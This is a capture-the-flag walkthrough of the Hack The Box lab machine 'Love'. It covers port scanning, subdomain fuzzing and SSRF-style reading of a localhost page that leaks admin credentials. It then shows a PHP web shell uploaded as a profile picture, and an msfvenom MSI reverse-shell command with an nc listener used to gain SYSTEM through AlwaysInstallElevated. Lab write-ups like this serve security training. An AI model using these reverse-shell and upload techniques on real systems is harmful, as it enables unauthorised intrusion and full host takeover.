---
description: https://app.hackthebox.com/machines/344
---

# Love

## Nmap

```
nmap 10.10.10.239 -p 80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001 -sV

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7680/tcp  open  pando-pub?
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
```

After performing standard enumeration against the non HTTP ports we are unable to pull any interesting information.

Looking at the HTTP ports we have 80,443,5000 and 47001. Apart from port 80 we get Forbidden on 443 and 5000. Port 47001 gives us a not found error.

![](<../../../.gitbook/assets/image (191).png>)

The root page for 80 takes us to a voters login page.

![](<../../../.gitbook/assets/image (76).png>)

Directory enumeration with `feroxbuster` shows a few pages of interest. Namely the `/admin` directory which redirects to `/admin/index.php`.

![](<../../../.gitbook/assets/image (12) (2) (1).png>)

Again, we are unable to leverage anything too interesting for the moment. I tried logging in with the username "admin" and was sent back an error for incorrect password. Using a different username presents an incorrect username and password error.

![](<../../../.gitbook/assets/image (1670).png>)

A password brute force on the admin account does not yield any successful logins.

At this point we can perform sub domain enumeration with `wfuzz` to see if we can pull anything of interest.

```
wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://love.htb" -H "Host: FUZZ.love.htb" --hl 125
```

![](<../../../.gitbook/assets/image (416).png>)

Here, we get a hit for the "staging" sub domain.

{% hint style="info" %}
Add "10.10.10.239 staging.htb.love" to /etc/hosts.
{% endhint %}

Where the root page for http://staging.love.htb takes us to the Free File Scanner page below.

![](<../../../.gitbook/assets/image (227).png>)

Checking the link at the drop for "Demo" we are taken to [http://staging.love.htb/beta.php](http://staging.love.htb/beta.php).

![](<../../../.gitbook/assets/image (168).png>)

From here I tried various PHP reverse shells and was unable to get them to execute as expected. Instead, this scanner appears to read the file contents only.

![](<../../../.gitbook/assets/image (147).png>)

Where this gets interesting, is that it is important to remember, the web server is operating in a different service or user context than us.

We can potentially use this to read the root pages of the otherwise forbidden pages we pulled from initial enumeration.

We can now read the root page for http://127.0.0.1:5000.

![](<../../../.gitbook/assets/image (324).png>)

Here we now the credentials: `admin:@LoveIsInTheAir!!!!`

Which can be used to login at `http://love.htb/admin/index.php`.

![](<../../../.gitbook/assets/image (419).png>)

From here, we notice we can interact with the users profile in the picture and use the "update" button to upload a new profile picture.

![](<../../../.gitbook/assets/image (2076).png>)

Knowing the web server is running PHP we can attempt to upload a PHP reverse shell. Using a webshell from: [https://github.com/WhiteWinterWolf/wwwolf-php-webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)

Upload the shell as a profile picture on the web server. After the uploaded completes click on the profile again and right click -> open image in a new tab to execute the web shell: [http://love.htb/images/shell.php](http://love.htb/images/shell.php)

![](<../../../.gitbook/assets/image (960).png>)

After doing some basic enumeration from within the web shell we see AlwaysInstallElevated is set to 0x1 (Enabled).

```
 Value 0x1 represents AlwaysInstallElevated as being enabled.

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

![](<../../../.gitbook/assets/image (1890).png>)

How to perform privilege escalation with AlwaysInstallElevated:

{% embed url="https://viperone.gitbook.io/pentest-everything/everything/everything-windows/privilege-escalation/registry/registry-alwaysinstallelevated" %}

Firstly on the attacking system generate a `msfvenom` MSI reverse shell.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f msi -o Application.msi
```

Then use the web shell to upload the Application.msi

![](<../../../.gitbook/assets/image (411).png>)

Then set a `nc` listener the attacking system.

```
sudo nc -lvp 443
```

Then, execute the Application.msi through the web shell.

```
cmd.exe /c C:\xampp\htdocs\omrs\images\Application.msi
```

We then land a SYSTEM shell.

![](<../../../.gitbook/assets/image (232).png>)
